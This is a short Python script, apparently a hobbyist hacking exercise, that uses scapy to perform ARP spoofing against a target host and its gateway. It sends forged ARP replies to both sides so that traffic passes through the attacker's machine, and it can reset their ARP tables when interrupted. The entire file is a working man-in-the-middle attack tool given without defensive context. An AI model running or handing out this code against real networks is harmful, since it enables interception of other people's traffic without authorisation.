import scapy.all as scapy
import optparse
import time

def get_mac_address(ip):
    arp_request_packet = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packet = broadcast_packet/arp_request_packet
    answered_list = scapy.srp(combined_packet,timeout=1,verbose=False)[0]

    return answered_list[0][1].hwsrc

def arp_spoofing(target_ip,poisoned_ip):
    target_mac = get_mac_address(target_ip)

    arp_response = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=poisoned_ip)
    scapy.send(arp_response,verbose=False)

def reset_operation(fooled_ip,gateway_ip):
    fooled_mac = get_mac_address(fooled_ip)
    gateway_mac = get_mac_address(gateway_ip)

    arp_response = scapy.ARP(op=2,pdst=fooled_ip,hwdst=fooled_mac,psrc=gateway_ip)
    scapy.send(arp_response,verbose=False,count=7)

def get_user_input():
    parse_object = optparse.OptionParser()

    parse_object.add_option("-t","--target",dest="target_ip",help="enter target ip")
    parse_object.add_option("-g","--gateway",dest="gateway_ip",help="enter gateway ip")

    options = parse_object.parse_args()[0]

    if not options.target_ip:
        print("enter target ip !")
    if not options.gateway_ip:
        print("enter gateway ip !")

    return options

number = 0

user_ips = get_user_input()
user_target_ip = user_ips.target_ip
user_gateway_ip = user_ips.gateway_ip

try:
    while number < 7:
        arp_spoofing(user_target_ip,user_gateway_ip)
        arp_spoofing(user_gateway_ip,user_target_ip)

        time.sleep(1)

        number += 1

        print("\rsending packets "+str(number))

except KeyboardInterrupt:
    reset_operation(user_target_ip,user_gateway_ip)
    reset_operation(user_gateway_ip,user_target_ip)
    print("\nQuit & Reset")

finally:
    print("Success !")